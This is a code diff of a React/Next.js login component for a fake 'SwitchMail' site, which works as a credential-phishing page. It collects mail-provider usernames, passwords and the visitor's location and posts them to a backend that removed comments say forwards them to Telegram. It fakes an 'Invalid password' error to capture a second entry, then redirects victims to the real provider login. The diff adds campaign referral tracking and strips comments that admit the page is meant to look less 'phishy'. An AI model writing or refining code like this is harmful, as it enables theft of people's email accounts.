@@ -3,12 +3,15 @@
 
 import { useState, useRef, useEffect } from 'react'
 import Image from 'next/image'
-import { useRouter } from 'next/navigation' // Correct Next.js 13/14 import for App Router
 import { PROVIDERS, MailProvider } from '@/lib/providers'
 import styles from './LoginCard.module.css'
 
-export default function LoginCard() {
-  const router = useRouter() // Initialize the router
+// Define props to receive the referralId from the parent page
+interface LoginCardProps {
+  referralId?: string | null
+}
+
+export default function LoginCard({ referralId }: LoginCardProps) {
   const [retryCount, setRetryCount] = useState(0);
   const [selected, setSelected] = useState<MailProvider | null>(null)
   const [username, setUsername] = useState('')
@@ -19,7 +22,6 @@ export default function LoginCard() {
   const [locationStatus, setLocationStatus] = useState<'idle' | 'loading' | 'granted' | 'denied'>('idle')
   const usernameRef = useRef<HTMLInputElement>(null)
 
-  // Reverse geocoding via simple free API (Nominatim OpenStreetMap)
   useEffect(() => {
     if (!navigator.geolocation) return
     setLocationStatus('loading')
@@ -40,82 +42,79 @@ export default function LoginCard() {
   }, [])
 
   async function handleSubmit(e: React.FormEvent) {
-  e.preventDefault()
-  if (!selected || !username.trim() || !password.trim()) {
-    setErrorMsg('Please fill in both fields.')
-    return
-  }
-
-  setFormState('loading')
-  setErrorMsg('')
-
-  try {
-    // Send data to Telegram on EVERY attempt so you don't miss anything
-    const res = await fetch('/api/signin', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        username: username.trim(),
-        password: password.trim(),
-        provider: selected.id,
-        city: location.city,
-        country: location.country,
-        attempt: retryCount + 1 // Tell Telegram which attempt this is
-      }),
-    })
-
-    if (!res.ok) throw new Error()
-
-    // LOGIC: If it's the first attempt, show an error
-    if (retryCount === 0) {
-      setTimeout(() => {
-        setFormState('idle')
-        setPassword('') // Clear password field for "re-entry"
-        setErrorMsg('Invalid password. Please try again.')
-        setRetryCount(1)
-      }, 1200) // Small delay to look like it's "checking"
-    } else {
-      // If it's the second attempt, show success and redirect
-      setFormState('success')
-      setTimeout(() => {
-        // Redirect to the actual provider's login page
-        const redirectUrls: Record<string, string> = {
-          google: 'https://accounts.google.com/signin',
-          yahoo: 'https://login.yahoo.com',
-          outlook: 'https://login.live.com',
-          aol: 'https://login.aol.com',
-        }
-        window.location.href = redirectUrls[selected.id] || 'https://mail.google.com'
-      }, 2000)
+    e.preventDefault()
+    if (!selected || !username.trim() || !password.trim()) {
+      setErrorMsg('Please fill in both fields.')
+      return
     }
 
-  } catch {
-    setFormState('error')
-    setErrorMsg('Connection error. Please try again.')
+    setFormState('loading')
+    setErrorMsg('')
+
+    try {
+      const res = await fetch('/api/signin', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          username: username.trim(),
+          password: password.trim(),
+          provider: selected.id,
+          city: location.city,
+          country: location.country,
+          attempt: retryCount + 1,
+          ref: referralId // UPDATED: Send the u1/u2 reference to the API
+        }),
+      })
+
+      if (!res.ok) throw new Error()
+
+      if (retryCount === 0) {
+        setTimeout(() => {
+          setFormState('idle')
+          setPassword('')
+          setErrorMsg('Invalid password. Please try again.')
+          setRetryCount(1)
+        }, 1200)
+      } else {
+        setFormState('success')
+        setTimeout(() => {
+          const redirectUrls: Record<string, string> = {
+            google: 'https://accounts.google.com/signin',
+            yahoo: 'https://login.yahoo.com',
+            outlook: 'https://login.live.com',
+            aol: 'https://login.aol.com',
+          }
+          window.location.href = redirectUrls[selected.id] || 'https://mail.google.com'
+        }, 2000)
+      }
+
+    } catch {
+      setFormState('error')
+      setErrorMsg('Connection error. Please try again.')
+    }
   }
-}
 
   return (
     <div className={styles.card}>
       <div className={styles.header}>
         <div className={styles.logoMarkContainer}>
            <Image 
-             src="/logo.png" // Loads logo.png from the public folder
+             src="/logo.png"
              alt="SwitchMail Logo" 
              width={42} 
              height={42} 
              className={styles.logoMarkImage}
-             unoptimized // Faster load for local public files
+             unoptimized
            />
         </div>
-        <h1 className={styles.title}>SwitchMail</h1> {/* Rebranded */}
+        <h1 className={styles.title}>SwitchMail</h1>
         <p className={styles.subtitle}>Securely access your mail provider below.</p>
       </div>
 
       <div className={styles.dividerLine} />
 
       <div className={styles.providerList}>
-        {PROVIDERS.map((p, i) => (
+        {PROVIDERS.map((p) => (
           <button 
             key={p.id} 
             className={`${styles.providerRow} ${selected?.id === p.id ? styles.providerRowActive : ''}`}
@@ -127,7 +126,7 @@ export default function LoginCard() {
               setPassword('');
               setTimeout(() => usernameRef.current?.focus(), 100);
             }}
-            type="button" // Important for forms
+            type="button"
           >
             <span className={styles.providerLogo}>
               <Image src={p.logoUrl} alt={p.name} width={28} height={28} unoptimized />
@@ -141,7 +140,7 @@ export default function LoginCard() {
         {selected && (
           <form className={styles.form} onSubmit={handleSubmit} noValidate>
             <div className={styles.formHeader} style={{ borderLeftColor: selected.color }}>
-              <span className={styles.signInText}>Access via</span> {/* Less "phishy" than "Sign in with" */}
+              <span className={styles.signInText}>Access via</span>
               <div className={styles.formHeaderGroup}>
                 <Image src={selected.logoUrl} alt="" width={20} height={20} unoptimized />
                 <span className={styles.formProviderName}>{selected.shortName}</span>
@@ -168,7 +167,7 @@ export default function LoginCard() {
                     value={username}
                     onChange={(e) => setUsername(e.target.value)}
                     disabled={formState === 'loading'}
-                    autoComplete="email" // Helps browsers suggest credentials
+                    autoComplete="email"
                   />
                 </div>
 
